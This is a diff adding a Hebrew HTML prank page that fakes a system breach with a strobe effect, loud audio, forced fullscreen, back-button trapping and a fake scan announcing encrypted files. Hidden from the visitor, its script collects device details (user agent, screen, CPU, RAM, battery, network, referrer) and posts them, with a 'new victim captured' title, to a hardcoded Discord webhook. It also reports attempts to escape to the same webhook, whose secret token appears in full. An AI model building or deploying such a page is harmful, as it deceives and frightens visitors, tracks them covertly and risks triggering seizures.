@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>טעינת מערכת...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            font-family: 'Courier New', Courier, monospace;
+            user-select: none;
+        }
+
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            z-index: 2;
+        }
+
+        /* --- כפתור הכניסה ההתחלתי --- */
+        #start-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px 35px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            background: linear-gradient(45deg, #007bff, #0056b3);
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            z-index: 20;
+            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.4);
+            font-family: Arial, sans-serif;
+            transition: all 0.2s ease;
+        }
+
+        #start-btn:hover {
+            transform: translate(-50%, -55%) scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 123, 255, 0.6);
+        }
+
+        /* --- אפקט זכוכית שבורה --- */
+        #crack-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://images.rawpixel.com/image_png_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIzLTA4L3Jhd3BpeGVsX29mZmljZV8yNl9waG90b19vZl9icm9rZW5fZ2xhc3NfX3RleHR1cmVfX2lzb2xhdGVkX29uX2JfOGVlMDY1ZjAtYzQyNC00NTEzLTk1YTUtNjJkZDhlZWM1YTZiLnBuZw.png');
+            background-size: cover;
+            background-position: center;
+            pointer-events: none;
+            z-index: 9;
+            opacity: 0.8;
+        }
+
+        /* --- שכבת סריקת קבצים (האקר) מטורפת --- */
+        #scanner-console {
+            display: none;
+            position: absolute;
+            top: 20px; left: 20px; width: calc(100% - 40px); height: calc(100% - 40px);
+            color: #0f0;
+            font-size: 16px;
+            line-height: 1.2;
+            overflow: hidden;
+            z-index: 4;
+            pointer-events: none;
+            text-shadow: 0 0 5px #0f0;
+            text-align: left;
+            direction: ltr;
+        }
+
+        /* --- שכבת תמונות 'האקרים' שזזות --- */
+        #hacker-images-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 3;
+            pointer-events: none;
+        }
+
+        .moving-hacker-img {
+            position: absolute;
+            max-width: 250px;
+            max-height: 250px;
+            opacity: 0.7;
+            animation: moveHackerImg 1s infinite linear;
+        }
+
+        @keyframes moveHackerImg {
+            0% { transform: translate(-100px, 0px) rotate(0deg); }
+            50% { transform: translate(calc(100vw - 150px), 0px) rotate(10deg); }
+            100% { transform: translate(-100px, 0px) rotate(0deg); }
+        }
+
+        /* --- אפקטים של המעבר המפחיד --- */
+        .shake-effect { animation: glitchShake 0.1s infinite !important; }
+
+        .strobe-effect {
+            animation: strobeBackground 0.08s infinite !important;
+            cursor: none !important;
+        }
+
+        @keyframes strobeBackground {
+            0% { background-color: #000000; }
+            33% { background-color: #ff0000; }
+            66% { background-color: #ffffff; }
+            100% { background-color: #000000; }
+        }
+
+        @keyframes glitchShake {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            10% { transform: translate(-5px, -3px) rotate(-1deg); }
+            20% { transform: translate(6px, 5px) rotate(1deg); }
+            30% { transform: translate(-3px, 4px) rotate(0deg); }
+            40% { transform: translate(5px, -4px) rotate(1deg); }
+            50% { transform: translate(-4px, 5px) rotate(-1deg); }
+            60% { transform: translate(6px, -3px) rotate(0deg); }
+            70% { transform: translate(-5px, 3px) rotate(1deg); }
+            80% { transform: translate(4px, 4px) rotate(-1deg); }
+            90% { transform: translate(-6px, -5px) rotate(0deg); }
+            100% { transform: translate(5px, 3px) rotate(1deg); }
+        }
+
+        /* --- אפקט מסך טלוויזיה מקולקל --- */
+        #crt-lines {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 4px, 6px 100%;
+            z-index: 8;
+            pointer-events: none;
+            animation: flickerScan 0.15s infinite;
+        }
+
+        /* --- הודעות ה-Glitch --- */
+        .glitch-text {
+            display: none;
+            position: absolute;
+            color: #0f0;
+            font-size: 30px;
+            font-weight: bold;
+            z-index: 5;
+            text-shadow: 0 0 10px #0f0;
+            animation: textGlitch 0.2s infinite;
+        }
+
+        @keyframes textGlitch {
+            0% { opacity: 1; transform: skewX(0deg); }
+            20% { opacity: 0.8; transform: skewX(-10deg); }
+            40% { opacity: 1; transform: skewX(10deg); color: #f00; }
+            60% { opacity: 0.5; transform: skewX(0deg); }
+            80% { opacity: 1; transform: skewX(-5deg); color: #0f0; }
+            100% { opacity: 0.8; transform: skewX(5deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="crt-lines"></div>
+    <div id="crack-overlay"></div>
+    <div id="scanner-console"></div>
+    <div id="hacker-images-overlay"></div>
+
+    <button id="start-btn">CLICK TO ENTER</button>
+
+    <img id="main-img" src="https://i.pinimg.com/736x/9f/50/fc/9f50fca68d7f08abe59228edd866f762.jpg" alt="Scene">
+
+    <div class="glitch-text" id="text1">SYSTEM BREACH</div>
+    <div class="glitch-text" id="text2">CRITICAL ERROR</div>
+    <div class="glitch-text" id="text3">INTRUDER DETECTED</div>
+
+    <audio id="dora-audio" loop preload="none">
+        <source src="dorasong.mp3" type="audio/mpeg">
+    </audio>
+
+    <audio id="scary-audio" loop preload="none">
+        <source src="scary.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        let started = false;
+        let scaryPhase = false;
+        let escapeAttempted = false;
+        let startTime = 0;
+        let scanInterval;
+
+        // ה-Webhook המאוחד שלך לכל ההתראות
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1506644775132987543/LRn4aqJWKPMOYMuMrsNHqGa2i3vAKhzPS3Ul0DA5cyPNNx30S3JCVi7umKdjkPgQysGF";
+
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { history.pushState(null, null, location.href); };
+
+        window.addEventListener('mousemove', function(e) {
+            if (!started) return;
+            if (e.clientY < 20) {
+                sendEscapeLog("ניסיון סגירת הטאב / הזזת עכבר לתפריט העליון");
+            }
+        });
+
+        window.addEventListener('keydown', function(e) {
+            if (!started) return;
+            if (e.key === 'Escape' || e.key === 'F11') {
+                sendEscapeLog(`ניסיון יציאה ממסך מלא בעזרת מקש: ${e.key}`);
+            }
+        });
+
+        document.getElementById('start-btn').addEventListener('click', function(e) {
+            e.stopPropagation();
+            if (started) return;
+            started = true;
+            startTime = Date.now();
+
+            this.style.display = 'none';
+            prepareAndSendLogs();
+
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+
+            var doraAudio = document.getElementById('dora-audio');
+            doraAudio.volume = 1.0;
+            doraAudio.play();
+
+            var scaryAudio = document.getElementById('scary-audio');
+            scaryAudio.load(); 
+
+            setTimeout(function() {
+                scaryPhase = true;
+                doraAudio.pause();
+                document.title = "⚠️ CRITICAL SYSTEM ERROR ⚠️";
+
+                document.getElementById('crt-lines').style.display = 'block';
+                document.getElementById('crack-overlay').style.display = 'block';
+
+                var imgElement = document.getElementById('main-img');
+                imgElement.src = "https://i.pinimg.com/webp/736x/c3/fe/8a/c3fe8a0d6bcbcdeeb4d310e4f5e598e4.webp";
+                imgElement.classList.add('shake-effect');
+                document.body.classList.add('strobe-effect');
+
+                scaryAudio.volume = 1.0;
+                scaryAudio.play().catch(err => console.log(err));
+
+                startFileScanner();
+                startHackerImages(); // הפעלת שכבת התמונות הזזות
+
+                showScaryElements();
+            }, 5000);
+        });
+
+        function showScaryElements() {
+            var texts = document.querySelectorAll('.glitch-text');
+            texts.forEach(function(text) {
+                text.style.display = 'block';
+                text.style.top = (Math.random() * 80 + 10) + '%';
+                text.style.left = (Math.random() * 80 + 10) + '%';
+            });
+        }
+
+        // פונקציית סריקת קבצים אגרסיבית יותר
+        function startFileScanner() {
+            const consoleElem = document.getElementById('scanner-console');
+            consoleElem.style.display = 'block';
+
+            const folders = ['Documents', 'Downloads', 'Desktop', 'Pictures', 'AppData\\Local'];
+            const fileTypes = ['.jpg', '.png', '.mp4', '.docx', '.xlsx', '.pdf', '.json', '.dat', '.db'];
+            const pool = ['user_data', 'passwords', 'credentials', 'config', 'backup', 'token', 'private_key', 'system_auth', 'discord_session', 'steam_login'];
+
+            let count = 0;
+
+            scanInterval = setInterval(() => {
+                if (count > 200) { // סריקה ארוכה יותר
+                    clearInterval(scanInterval);
+                    consoleElem.innerHTML += `<br><span style="color:#f00; font-weight:bold; font-size:20px;">[!] Scan Complete. Potential Target Files Encrypted. Waiting for Key...</span>`;
+                    return;
+                }
+
+                let randFolder = folders[Math.floor(Math.random() * folders.length)];
+                let randFile = pool[Math.floor(Math.random() * pool.length)] + "_" + Math.floor(Math.random() * 900 + 100) + fileTypes[Math.floor(Math.random() * fileTypes.length)];
+                let size = (Math.random() * 100 + 1).toFixed(1);
+
+                let line = `[+] Factoring: C:\\Users\\Target_User\\${randFolder}\\${randFile} (${size} MB) -> [SUCCESS]<br>`;
+                consoleElem.innerHTML += line;
+
+                consoleElem.scrollTop = consoleElem.scrollHeight;
+                count++;
+            }, 25); // סריקה מהירה בטירוף
+        }
+
+        // פונקציה שיוצרת את שכבת התמונות הזזות של האקרים
+        function startHackerImages() {
+            const overlay = document.getElementById('hacker-images-overlay');
+            overlay.style.display = 'block';
+
+            // URLs של תמונות 'האקרים' גנריות
+            const imageUrls = [
+                'https://i.imgur.com/vHkWq1M.png', // בוט האקר
+                'https://i.imgur.com/O6Ld4Yl.png', // סמל כשל מערכת
+                'https://i.imgur.com/kS9l5gM.png', // קוד מטריקס
+                'https://i.imgur.com/YjGkZ6s.png', // סמל פריצה
+                'https://i.imgur.com/C5uG5Cj.png'  // קובץ נעול
+            ];
+
+            let imgCount = 0;
+
+            const imgInterval = setInterval(() => {
+                if (imgCount > 15) { // הגבלת כמות התמונות על המסך
+                    clearInterval(imgInterval);
+                    return;
+                }
+
+                let randUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
+                let img = document.createElement('img');
+                img.src = randUrl;
+                img.className = 'moving-hacker-img';
+                
+                // מיקום רנדומלי על הציר האנכי
+                img.style.top = (Math.random() * 80 + 10) + '%';
+                
+                overlay.appendChild(img);
+                imgCount++;
+            }, 800); // כל 0.8 שניות מופיעה תמונה חדשה
+        }
+
+        function sendEscapeLog(reason) {
+            if (!DISCORD_WEBHOOK || escapeAttempted) return;
+            escapeAttempted = true;
+
+            const currentTime = new Date().toLocaleString('he-IL', { timeZone: 'Asia/Jerusalem' });
+            const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(1);
+
+            const escapeEmbed = {
+                username: "Escape Detection System 🚨",
+                avatar_url: "https://i.imgur.com/vHkWq1M.png",
+                embeds: [{
+                    title: "🚨 התראת ניסיון בריחה מהמערכת!",
+                    description: `המשתמש ניסה לבצע פעולת סגירה או יציאה לאחר **${elapsedSeconds} שניות** בתוך החוויה.`,
+                    color: 16753920,
+                    fields: [
+                        { name: "⏰ זמן פעילות מקומי", value: currentTime, inline: true },
+                        { name: "⏱️ זמן עמידות בדף", value: `${elapsedSeconds} שניות`, inline: true },
+                        { name: "🔍 הפעולה המדויקת שזוהתה", value: `\`${reason}\``, inline: false }
+                    ],
+                    footer: { text: "Anti-Escape Tracker v2.0" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(escapeEmbed) }).catch(err => console.log(err));
+        }
+
+        async function prepareAndSendLogs() {
+            if (!DISCORD_WEBHOOK) return;
+
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer || "כניסה ישירה / אפליקציה חיצונית";
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language || "לא ידוע";
+            const currentTime = new Date().toLocaleString('he-IL', { timeZone: 'Asia/Jerusalem' });
+
+            const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ליבות` : "לא ידוע";
+            const ramMemory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "לא ידוע";
+            
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkType = connection ? `${connection.effectiveType || 'לא ידוע'} (${connection.type || 'אלחוטי/אחר'})` : "לא ידוע";
+
+            let batteryInfo = "לא נתמך בדפדפן זה";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100) + "%";
+                    const charging = battery.charging ? "בטעינה 🔌" : "לא בטעינה 🔋";
+                    batteryInfo = `${level} (${charging})`;
+                } catch (e) {}
+            }
+
+            const embedData = {
+                username: "BogiScanner Forensic Tool ⚠️",
+                avatar_url: "https://i.imgur.com/vHkWq1M.png",
+                embeds: [{
+                    title: "🎯 פריצה בוצעה - קורבן חדש נלכד במערכת!",
+                    description: "נתוני חומרה וסביבה נשלפו בהצלחה דרך הדפדפן.",
+                    color: 16711680,
+                    fields: [
+                        { name: "⏰ זמן פעילות (ישראל)", value: currentTime, inline: true },
+                        { name: "🖥️ רזולוציית מסך", value: screenResolution, inline: true },
+                        { name: "🌐 שפת מערכת", value: language, inline: true },
+                        { name: "⚙️ מעבד (CPU)", value: cpuCores, inline: true },
+                        { name: "💾 זיכרון RAM מוערך", value: ramMemory, inline: true },
+                        { name: "🔋 מצב סוללה", value: batteryInfo, inline: true },
+                        { name: "📶 סוג רשת אינטרנט", value: networkType, inline: false },
+                        { name: "🔗 מקור הגעה (Referrer)", value: referrer, inline: false },
+                        { name: "📱 מפרט מכשיר ודפדפן (User-Agent)", value: `\`\`\`text\n${userAgent}\n\`\`\``, inline: false }
+                    ],
+                    footer: { text: "BogiScanner Security Monitor v4.2" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) }).catch(err => console.log(err));
+        }
+    </script>
+
+</body>
+</html>
